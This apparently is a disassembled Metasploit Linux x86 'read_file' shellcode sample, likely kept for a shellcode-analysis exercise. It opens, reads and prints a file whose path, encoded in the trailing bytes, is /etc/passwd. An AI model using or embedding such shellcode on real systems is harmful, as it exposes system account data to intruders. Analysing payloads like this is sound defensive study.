; Name; msf_linx86_readfile_asm_sample3.asm
; Author hodorsec

global _start
section .text

_start:
	
jmp short 0x38
mov eax,0x5
pop ebx
xor ecx,ecx
int 0x80
mov ebx,eax
mov eax,0x3
mov edi,esp
mov ecx,edi
mov edx,0x1000
int 0x80
mov edx,eax
mov eax,0x4
mov ebx,0x1
int 0x80
mov eax,0x1
mov ebx,0x0
int 0x80
call dword 0x2
das
gs jz 0xa4
das
jnc 0xac
popad
fs outsd
ja 0x49

